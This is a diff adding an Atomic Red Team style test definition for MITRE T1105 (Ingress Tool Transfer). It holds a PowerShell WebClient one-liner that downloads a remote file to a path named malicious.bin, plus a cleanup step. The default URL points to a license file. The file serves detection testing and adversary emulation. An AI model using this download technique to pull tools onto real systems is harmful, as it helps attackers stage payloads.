@@ -1,0 +1,44 @@
+# Converted from Atomic Red Team - Ingress Tool Transfer
+# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1105
+# Original auto_generated_guid: 42dc4460-9aa6-45d3-b1a6-3955d34e1fe8
+
+---
+api_version: 2.0
+uuid: fb488334-bcc5-4379-b436-6cb47aee5c32
+name: Windows - PowerShell Download
+authors:
+  - isaac_fletcher
+  - Atomic Red Team
+description: |
+  This test uses PowerShell to download a payload.
+  This technique is used by multiple adversaries and malware families.
+
+mitre:
+  tactics:
+    - "TA0011 Command and Control"
+  techniques:
+    - "T1105 Ingress Tool Transfer"
+
+requirements:
+  platforms:
+    - os: windows
+
+args:
+  - name: remote_file
+    description: URL of file to copy
+    type: string
+    default: "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/dd526047b8c399c312fee47d1e6fb531164da54d/LICENSE.txt"
+  - name: local_file
+    description: Local file path to save downloaded file
+    type: path
+    default: "C:\\Users\\Public\\malicious.bin"
+
+steps:
+  - name: download_file_with_powershell
+    executor: powershell
+    inline: |
+      (New-Object System.Net.WebClient).DownloadFile("{{.Args.remote_file}}", "{{.Args.local_file}}")
+    cleanup:
+      executor: powershell
+      inline: |
+        Remove-Item {{.Args.local_file}} -Force -ErrorAction Ignore
